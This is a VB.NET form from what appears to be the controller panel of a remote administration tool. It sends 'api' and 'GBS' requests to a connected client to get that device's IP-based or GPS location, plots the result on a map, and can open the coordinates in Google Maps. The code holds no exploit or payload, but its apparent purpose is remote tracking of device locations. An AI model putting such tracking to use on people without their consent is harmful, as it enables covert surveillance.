Public Class Maps
    Public C As Client
    Private Sub Maps_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Server.updater()
    End Sub

    Private Sub IPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles IPToolStripMenuItem.Click
        GMapControl1.Overlays.Clear()

        Dim B As Byte() = SB("api")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        Try
            If ToolStripStatusLabel1.Text = "Error!" Or ToolStripStatusLabel1.Text = ".." Or ToolStripStatusLabel1.Text = Nothing Then
            Else
                Process.Start("https://www.google.com/maps/place/" + ToolStripStatusLabel1.Text)
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Maps_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing

        Dim B As Byte() = SB("Clmaps")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub GPSToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GPSToolStripMenuItem.Click
        GMapControl1.Overlays.Clear()

        Dim B As Byte() = SB("GBS")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class